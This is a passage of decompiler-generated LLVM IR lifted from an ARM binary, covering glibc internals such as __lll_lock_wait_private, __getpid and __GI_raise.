  %v1_15ef8 = phi i32 [ %v0_15ef4, %dec_label_pc_15ef4 ], [ %v2_15ec8, %dec_label_pc_15ec8 ], [ %v1_15ed8.pre, %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge ]
  %v3_15ef8 = icmp uge i32 %v0_15f00, %v1_15ef8
  store i1 %v3_15ef8, i1* %cpsr_c.global-to-local, align 1
  %v9_15ef8 = icmp eq i32 %v0_15f00, %v1_15ef8
  br i1 %v9_15ef8, label %dec_label_pc_15f00, label %dec_label_pc_15ef8.dec_label_pc_15ec8_crit_edge

dec_label_pc_15ef8.dec_label_pc_15ec8_crit_edge:  ; preds = %dec_label_pc_15ef8
  %v0_15ec8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ec8

dec_label_pc_15f00:                               ; preds = %dec_label_pc_15ef8
  %v2_15f00 = icmp ne i32 %v1_15ef8, 0
  store i1 %v2_15f00, i1* %cpsr_c.global-to-local, align 1
  %v7_15f04 = icmp slt i32 %v1_15ef8, 2
  br i1 %v7_15f04, label %dec_label_pc_15fb0thread-pre-split, label %dec_label_pc_15f08

dec_label_pc_15f08:                               ; preds = %dec_label_pc_15f00
  %v0_15f08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15f08, i32* %r0.global-to-local, align 4
  %v0_15f0c = load i32, i32* @r1, align 4
  %v1_15f0c = add i32 %v0_15f0c, 129
  store i32 %v1_15f0c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fb0thread-pre-split

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15fb0thread-pre-split, %dec_label_pc_15fac
  %v0_15f24 = phi i32 [ %v3_15fac, %dec_label_pc_15fac ], [ %v0_15fb0.pr, %dec_label_pc_15fb0thread-pre-split ]
  %v1_15f24 = inttoptr i32 %v0_15f24 to i32*
  %v2_15f24 = load i32, i32* %v1_15f24, align 4
  store i32 %v2_15f24, i32* %r3.global-to-local, align 4
  %v1_15f28 = add i32 %v2_15f24, 8
  %v2_15f28 = inttoptr i32 %v1_15f28 to i32*
  %v3_15f28 = load i32, i32* %v2_15f28, align 4
  store i32 %v3_15f28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f2c = icmp eq i32 %v3_15f28, 0
  br i1 %v2_15f2c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15f24
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15f24, %bb75
  %v2_15f34 = xor i1 %v2_15f2c, true
  call void @__pseudo_cond_branch(i1 %v2_15f34, i32 %v3_15f28)
  %v0_15f38 = load i32, i32* %r6.global-to-local, align 4
  %v1_15f38 = inttoptr i32 %v0_15f38 to i32*
  %v2_15f38 = load i32, i32* %v1_15f38, align 4
  store i32 %v2_15f38, i32* %r5.global-to-local, align 4
  %v1_15f3c = add i32 %v2_15f38, 20
  store i32 %v1_15f3c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f40

dec_label_pc_15f40:                               ; preds = %dec_label_pc_15f74.dec_label_pc_15f40_crit_edge, %bb76
  %v0_15f44 = phi i32 [ %v0_15f44.pre, %dec_label_pc_15f74.dec_label_pc_15f40_crit_edge ], [ %v1_15f3c, %bb76 ]
  %v0_15f40 = phi i32 [ %v0_15f40.pre, %dec_label_pc_15f74.dec_label_pc_15f40_crit_edge ], [ %v2_15f38, %bb76 ]
  %v1_15f40 = add i32 %v0_15f40, 20
  %v2_15f40 = inttoptr i32 %v1_15f40 to i32*
  %v3_15f40 = load i32, i32* %v2_15f40, align 4
  store i32 %v0_15f44, i32* %r2.global-to-local, align 4
  store i32 %v3_15f40, i32* %r4.global-to-local, align 4
  %v1_15f4c = add i32 %v3_15f40, -1
  store i32 %v1_15f4c, i32* @r1, align 4
  %v1_15f5087 = inttoptr i32 %v0_15f44 to i32*
  %v2_15f5088 = load i32, i32* %v1_15f5087, align 4
  store i32 %v2_15f5088, i32* %r3.global-to-local, align 4
  %v3_15f5490 = icmp uge i32 %v2_15f5088, %v3_15f40
  store i1 %v3_15f5490, i1* %cpsr_c.global-to-local, align 1
  %v9_15f5496 = icmp eq i32 %v2_15f5088, %v3_15f40
  br i1 %v9_15f5496, label %dec_label_pc_15f5c, label %dec_label_pc_15f74

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f40, %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge
  %v0_15f5c97 = phi i32 [ %v1_15f54.pre, %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge ], [ %v3_15f40, %dec_label_pc_15f40 ]
  store i32 %v0_15f5c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f6c, label %dec_label_pc_15f70, label %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge

dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge:  ; preds = %dec_label_pc_15f5c
  %v0_15f50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f50 = inttoptr i32 %v0_15f50.pre to i32*
  %v2_15f50 = load i32, i32* %v1_15f50, align 4
  store i32 %v2_15f50, i32* %r3.global-to-local, align 4
  %v3_15f54 = icmp uge i32 %v2_15f50, %v1_15f54.pre
  store i1 %v3_15f54, i1* %cpsr_c.global-to-local, align 1
  %v9_15f54 = icmp eq i32 %v2_15f50, %v1_15f54.pre
  br i1 %v9_15f54, label %dec_label_pc_15f5c, label %dec_label_pc_15f74

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f5c
  %v0_15f70 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f74

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f40, %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge, %dec_label_pc_15f70
  %v0_15f80 = phi i32 [ %v0_15f70, %dec_label_pc_15f70 ], [ %v2_15f5088, %dec_label_pc_15f40 ], [ %v2_15f50, %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge ]
  %v1_15f74 = phi i32 [ %v0_15f70, %dec_label_pc_15f70 ], [ %v3_15f40, %dec_label_pc_15f40 ], [ %v1_15f54.pre, %dec_label_pc_15f5c.dec_label_pc_15f50_crit_edge ]
  %v3_15f74 = icmp uge i32 %v0_15f80, %v1_15f74
  store i1 %v3_15f74, i1* %cpsr_c.global-to-local, align 1
  %v9_15f74 = icmp eq i32 %v0_15f80, %v1_15f74
  store i32 %v0_15f80, i32* %r2.global-to-local, align 4
  br i1 %v9_15f74, label %dec_label_pc_15f80, label %dec_label_pc_15f74.dec_label_pc_15f40_crit_edge

dec_label_pc_15f74.dec_label_pc_15f40_crit_edge:  ; preds = %dec_label_pc_15f74
  %v0_15f40.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15f44.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f40

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f74
  %v2_15f80 = icmp ne i32 %v1_15f74, 0
  store i1 %v2_15f80, i1* %cpsr_c.global-to-local, align 1
  %v7_15f80 = icmp eq i32 %v1_15f74, 1
  %v0_15f88 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_15f80, label %dec_label_pc_15f88, label %dec_label_pc_15fac

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f80
  %v1_15f88 = inttoptr i32 %v0_15f88 to i32*
  %v2_15f88 = load i32, i32* %v1_15f88, align 4
  store i32 %v2_15f88, i32* @r1, align 4
  %v1_15f8c = add i32 %v2_15f88, 24
  %v2_15f8c = inttoptr i32 %v1_15f8c to i32*
  %v3_15f8c = load i32, i32* %v2_15f8c, align 4
  store i32 %v3_15f8c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f90 = icmp eq i32 %v3_15f8c, 0
  br i1 %v2_15f90, label %dec_label_pc_15fac, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f88
  %v1_15f98 = add i32 %v2_15f88, 20
  %v2_15f98 = inttoptr i32 %v1_15f98 to i32*
  %v3_15f98 = load i32, i32* %v2_15f98, align 4
  store i32 %v3_15f98, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fac

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15f80, %dec_label_pc_15f98, %dec_label_pc_15f88
  %v1_15fac = add i32 %v0_15f88, 4
  %v2_15fac = inttoptr i32 %v1_15fac to i32*
  %v3_15fac = load i32, i32* %v2_15fac, align 4
  store i32 %v3_15fac, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fb0 = icmp eq i32 %v3_15fac, 0
  br i1 %v2_15fb0, label %dec_label_pc_15fb8, label %dec_label_pc_15f24

dec_label_pc_15fb0thread-pre-split:               ; preds = %dec_label_pc_15f08, %dec_label_pc_15f00, %dec_label_pc_15ea0
  %v0_15fb0.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fb011 = icmp eq i32 %v0_15fb0.pr, 0
  br i1 %v2_15fb011, label %dec_label_pc_15fb8, label %dec_label_pc_15f24

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fac, %dec_label_pc_15fb0thread-pre-split
  %v0_15fb8.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15fb8.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_15fb8.pre

; uselistorder directives
  uselistorder i32 %v0_15fb0.pr, { 1, 0 }
  uselistorder i32 %v3_15fac, { 1, 2, 0 }
  uselistorder i32 %v1_15f74, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15f70, { 1, 0, 2 }
  uselistorder i32 %v1_15f54.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15ef4, { 1, 0, 2 }
  uselistorder i32 %v1_15ed8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15ec8, { 1, 0 }
  uselistorder i32 %v0_15d6c, { 1, 0, 2 }
  uselistorder i32 %v1_15d50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15d28, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15d00, { 1, 0, 2 }
  uselistorder i32 %v1_15ce4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_15cac, { 1, 0, 2 }
  uselistorder i32 %v0_15c8c, { 1, 0, 2 }
  uselistorder i32 %v1_15c70.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 0, 10, 11, 12, 13, 15, 14, 1, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 3, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15fb8, { 1, 0 }
  uselistorder label %dec_label_pc_15fac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15f74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f5c, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ee0, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15d70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d58, { 1, 0 }
  uselistorder label %dec_label_pc_15d04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cec, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_15c90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15c78, { 1, 0 }
  uselistorder label %dec_label_pc_15d14.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15c44, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15ff0 = load i32, i32* @r4, align 4
  store i32 %v3_15ff0, i32* %stack_var_-16, align 4
  %v0_15ff4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15ff4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ff8

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_16078.dec_label_pc_15ff8_crit_edge, %entry
  %v0_15ffc = phi i32 [ %v0_15ffc.pre, %dec_label_pc_16078.dec_label_pc_15ff8_crit_edge ], [ %v0_15ff4, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_15ffc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1600417 = inttoptr i32 %v0_15ffc to i32*
  %v2_1600418 = load i32, i32* %v1_1600417, align 4
  %v3_1600820 = icmp ne i32 %v2_1600418, 0
  store i1 %v3_1600820, i1* %cpsr_c.global-to-local, align 1
  %v9_1600826 = icmp eq i32 %v2_1600418, 1
  br i1 %v9_1600826, label %dec_label_pc_16010, label %dec_label_pc_16028

dec_label_pc_16010:                               ; preds = %dec_label_pc_15ff8, %dec_label_pc_16010.dec_label_pc_16004_crit_edge
  %v0_1601027 = phi i32 [ %v1_16008.pre, %dec_label_pc_16010.dec_label_pc_16004_crit_edge ], [ 1, %dec_label_pc_15ff8 ]
  store i32 %v0_1601027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16020 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16020, label %dec_label_pc_16024, label %dec_label_pc_16010.dec_label_pc_16004_crit_edge

dec_label_pc_16010.dec_label_pc_16004_crit_edge:  ; preds = %dec_label_pc_16010
  %v0_16004.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16008.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16004 = inttoptr i32 %v0_16004.pre to i32*
  %v2_16004 = load i32, i32* %v1_16004, align 4
  %v3_16008 = icmp uge i32 %v2_16004, %v1_16008.pre
  store i1 %v3_16008, i1* %cpsr_c.global-to-local, align 1
  %v9_16008 = icmp eq i32 %v2_16004, %v1_16008.pre
  br i1 %v9_16008, label %dec_label_pc_16010, label %dec_label_pc_16028

dec_label_pc_16024:                               ; preds = %dec_label_pc_16010
  %v0_16024 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16028

dec_label_pc_16028:                               ; preds = %dec_label_pc_15ff8, %dec_label_pc_16010.dec_label_pc_16004_crit_edge, %dec_label_pc_16024
  %v0_16028 = phi i32 [ %v0_16024, %dec_label_pc_16024 ], [ %v2_1600418, %dec_label_pc_15ff8 ], [ %v2_16004, %dec_label_pc_16010.dec_label_pc_16004_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16028 = icmp eq i32 %v0_16028, 0
  %v0_1604c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_16028, label %dec_label_pc_16048, label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_16028
  store i32 %v0_1604c.pre, i32* %r0.global-to-local, align 4
  %v0_16034 = load i32, i32* %r1.global-to-local, align 4
  %v1_16034 = add i32 %v0_16034, 126
  store i32 %v1_16034, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16048

dec_label_pc_16048:                               ; preds = %dec_label_pc_16028, %dec_label_pc_16030
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1604c.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1605428 = inttoptr i32 %v0_1604c.pre to i32*
  %v2_1605429 = load i32, i32* %v1_1605428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1605836 = icmp eq i32 %v2_1605429, 0
  br i1 %v9_1605836, label %dec_label_pc_16060, label %dec_label_pc_16078

dec_label_pc_16060:                               ; preds = %dec_label_pc_16048, %dec_label_pc_16060.dec_label_pc_16054_crit_edge
  %v0_1606037 = phi i32 [ %v1_16058.pre, %dec_label_pc_16060.dec_label_pc_16054_crit_edge ], [ 0, %dec_label_pc_16048 ]
  store i32 %v0_1606037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16070 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16070, label %dec_label_pc_16074, label %dec_label_pc_16060.dec_label_pc_16054_crit_edge

dec_label_pc_16060.dec_label_pc_16054_crit_edge:  ; preds = %dec_label_pc_16060
  %v0_16054.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16058.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16054 = inttoptr i32 %v0_16054.pre to i32*
  %v2_16054 = load i32, i32* %v1_16054, align 4
  %v3_16058 = icmp uge i32 %v2_16054, %v1_16058.pre
  store i1 %v3_16058, i1* %cpsr_c.global-to-local, align 1
  %v9_16058 = icmp eq i32 %v2_16054, %v1_16058.pre
  br i1 %v9_16058, label %dec_label_pc_16060, label %dec_label_pc_16078

dec_label_pc_16074:                               ; preds = %dec_label_pc_16060
  %v0_16074 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_16048, %dec_label_pc_16060.dec_label_pc_16054_crit_edge, %dec_label_pc_16074
  %v0_16078 = phi i32 [ %v0_16074, %dec_label_pc_16074 ], [ %v2_1605429, %dec_label_pc_16048 ], [ %v2_16054, %dec_label_pc_16060.dec_label_pc_16054_crit_edge ]
  %v1_16078 = phi i32 [ %v0_16074, %dec_label_pc_16074 ], [ 0, %dec_label_pc_16048 ], [ %v1_16058.pre, %dec_label_pc_16060.dec_label_pc_16054_crit_edge ]
  %v3_16078 = icmp uge i32 %v0_16078, %v1_16078
  store i1 %v3_16078, i1* %cpsr_c.global-to-local, align 1
  %v9_16078 = icmp eq i32 %v0_16078, %v1_16078
  br i1 %v9_16078, label %dec_label_pc_16080, label %dec_label_pc_16078.dec_label_pc_15ff8_crit_edge

dec_label_pc_16078.dec_label_pc_15ff8_crit_edge:  ; preds = %dec_label_pc_16078
  %v0_15ffc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ff8

dec_label_pc_16080:                               ; preds = %dec_label_pc_16078
  %v2_16080 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16080, i32* %r4.global-to-local, align 4
  %v1_16084 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16084

; uselistorder directives
  uselistorder i32 %v0_16074, { 1, 0 }
  uselistorder i32 %v1_16058.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16008.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1600418, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 8, 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_16078, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16060, { 1, 0 }
  uselistorder label %dec_label_pc_16048, { 1, 0 }
  uselistorder label %dec_label_pc_16028, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16010, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16088 = load i32, i32* @r7, align 4
  store i32 %v3_16088, i32* %stack_var_-8, align 4
  %v0_1608c = call i32 @__aeabi_read_tp()
  store i32 %v0_1608c, i32* %r0.global-to-local, align 4
  %v1_16090 = add i32 %v0_1608c, -1060
  %v2_16090 = inttoptr i32 %v1_16090 to i32*
  %v3_16090 = load i32, i32* %v2_16090, align 4
  %tmp7 = icmp slt i32 %v3_16090, 1
  br i1 %tmp7, label %dec_label_pc_160a0, label %dec_label_pc_160c4

dec_label_pc_160a0:                               ; preds = %entry
  %v2_16094 = icmp eq i32 %v3_16090, 0
  br i1 %v2_16094, label %dec_label_pc_160a4, label %dec_label_pc_160b0

dec_label_pc_160a4:                               ; preds = %dec_label_pc_160a0
  %v1_160a4 = add i32 %v0_1608c, -1064
  %v2_160a4 = inttoptr i32 %v1_160a4 to i32*
  %v3_160a4 = load i32, i32* %v2_160a4, align 4
  store i32 %v3_160a4, i32* %r0.global-to-local, align 4
  %v2_160a8 = icmp eq i32 %v3_160a4, 0
  br i1 %v2_160a8, label %bb, label %bb8

dec_label_pc_160b0:                               ; preds = %dec_label_pc_160a0
  br label %bb8

bb:                                               ; preds = %dec_label_pc_160a4
  store i32 0, i32* %v2_160a4, align 4
  %v0_160c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_160b0, %dec_label_pc_160a4, %bb
  %v0_160c0 = phi i32 [ %v3_160a4, %dec_label_pc_160a4 ], [ %v0_1608c, %dec_label_pc_160b0 ], [ %v0_160c0.pre, %bb ]
  br label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %entry, %bb8
  %v0_160c4 = phi i32 [ %v3_16090, %entry ], [ %v0_160c0, %bb8 ]
  store i32 %v0_160c4, i32* %r0.global-to-local, align 4
  %v2_160c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_160c8, i32* @r7, align 4
  ret i32 %v0_160c4

; uselistorder directives
  uselistorder i32 %v0_160c4, { 1, 0 }
  uselistorder i32 %v3_16090, { 1, 2, 0 }
  uselistorder label %dec_label_pc_160c4, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_160d0 = load i32, i32* @r4, align 4
  store i32 %v3_160d0, i32* %stack_var_-20, align 4
  %v0_160d8 = call i32 @__aeabi_read_tp()
  store i32 %v0_160d8, i32* %r0.global-to-local, align 4
  %v1_160dc = add i32 %v0_160d8, -1064
  %v2_160dc = inttoptr i32 %v1_160dc to i32*
  %v3_160dc = load i32, i32* %v2_160dc, align 4
  store i32 %v3_160dc, i32* %r4.global-to-local, align 4
  %v2_160e0 = icmp eq i32 %v3_160dc, 0
  %v1_160e8 = add i32 %v0_160d8, -1060
  %v2_160e8 = inttoptr i32 %v1_160e8 to i32*
  %v3_160e8 = load i32, i32* %v2_160e8, align 4
  store i32 %v3_160e8, i32* %r0.global-to-local, align 4
  br i1 %v2_160e0, label %dec_label_pc_160f0, label %dec_label_pc_16104

dec_label_pc_160f0:                               ; preds = %entry
  store i32 %v3_160e8, i32* %r4.global-to-local, align 4
  store i32 %v3_160e8, i32* %v2_160dc, align 4
  %v0_1612c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_16104:                               ; preds = %entry
  %v5_16108 = icmp sgt i32 %v3_160e8, 0
  br i1 %v5_16108, label %bb28, label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16104
  %tmp = bitcast i32 %v3_160e8 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1610c = bitcast float %tmp30 to i32
  %v2_16110 = icmp eq i32 %v1_1610c, 0
  br i1 %v2_16110, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1610c
  store i32 %v3_160dc, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1610c
  %v2_16118 = sub i32 0, %v3_160e8
  store i32 %v2_16118, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_16104, %dec_label_pc_160f0, %.thread
  %v0_16130 = phi i32 [ %v3_160e8, %dec_label_pc_16104 ], [ %v0_1612c.pre, %dec_label_pc_160f0 ], [ %v3_160dc, %bb ], [ %v2_16118, %.thread ]
  store i32 %v0_16130, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_16130, -4095
  br i1 %tmp31, label %dec_label_pc_16154, label %dec_label_pc_1613c

dec_label_pc_1613c:                               ; preds = %bb28
  %v0_16140 = call i32 @__aeabi_read_tp()
  %v3_16144 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16144 = sext i16 %v3_16144 to i32
  %v0_16148 = load i32, i32* %r2.global-to-local, align 4
  %v1_16148 = sub i32 0, %v0_16148
  store i32 %v1_16148, i32* %r2.global-to-local, align 4
  %v3_1614c = add i32 %v4_16144, %v0_16140
  %v4_1614c = inttoptr i32 %v3_1614c to i32*
  store i32 %v1_16148, i32* %v4_1614c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16154:                               ; preds = %bb28, %dec_label_pc_1613c
  %v0_16158 = phi i32 [ %v0_16130, %bb28 ], [ -1, %dec_label_pc_1613c ]
  %v3_16154 = icmp eq i32 %v0_16158, -1
  store i32 %v0_16158, i32* %r5.global-to-local, align 4
  br i1 %v3_16154, label %dec_label_pc_16160, label %dec_label_pc_161a8

dec_label_pc_16160:                               ; preds = %dec_label_pc_16154
  %v0_16164 = call i32 @__aeabi_read_tp()
  store i32 %v0_16164, i32* %r0.global-to-local, align 4
  %v3_16168 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16168 = sext i16 %v3_16168 to i32
  %v2_1616c = add i32 %v4_16168, %v0_16164
  %v3_1616c = inttoptr i32 %v2_1616c to i32*
  %v4_1616c = load i32, i32* %v3_1616c, align 4
  %v7_16170 = icmp eq i32 %v4_1616c, 38
  br i1 %v7_16170, label %dec_label_pc_1617c, label %dec_label_pc_16160.dec_label_pc_161a8_crit_edge

dec_label_pc_16160.dec_label_pc_161a8_crit_edge:  ; preds = %dec_label_pc_16160
  %v0_161a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a8

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16160
  %v0_1617c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1617c, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_1617c, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_1617c
  %v5_16194 = sub i32 0, %v0_1617c
  store i32 %v5_16194, i32* %r2.global-to-local, align 4
  %v7_16198 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_e2dc.932 to i32), i32 ptrtoint (i32* @global_var_161a0.933 to i32)) to i32*), align 4
  %v4_1619c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_1619c, i32* %r0.global-to-local, align 4
  %v7_161a0 = add i32 %v7_16198, %v0_16164
  %v8_161a0 = inttoptr i32 %v7_161a0 to i32*
  store i32 %v5_16194, i32* %v8_161a0, align 4
  %v0_161a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_1617c, %bb29
  %v0_161a4 = phi i32 [ %v0_161a4.pre, %bb29 ], [ %v0_1617c, %dec_label_pc_1617c ]
  store i32 %v0_161a4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a8

dec_label_pc_161a8:                               ; preds = %dec_label_pc_16160.dec_label_pc_161a8_crit_edge, %dec_label_pc_16154, %.thread22
  %v0_161a8 = phi i32 [ %v0_161a8.pre, %dec_label_pc_16160.dec_label_pc_161a8_crit_edge ], [ %v0_16158, %dec_label_pc_16154 ], [ %v0_161a4, %.thread22 ]
  store i32 %v0_161a8, i32* %r0.global-to-local, align 4
  %v2_161ac = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_161ac, i32* @r4, align 4
  ret i32 %v0_161a8

; uselistorder directives
  uselistorder i32 %v0_161a8, { 1, 0 }
  uselistorder i32 %v0_1617c, { 1, 2, 0, 3 }
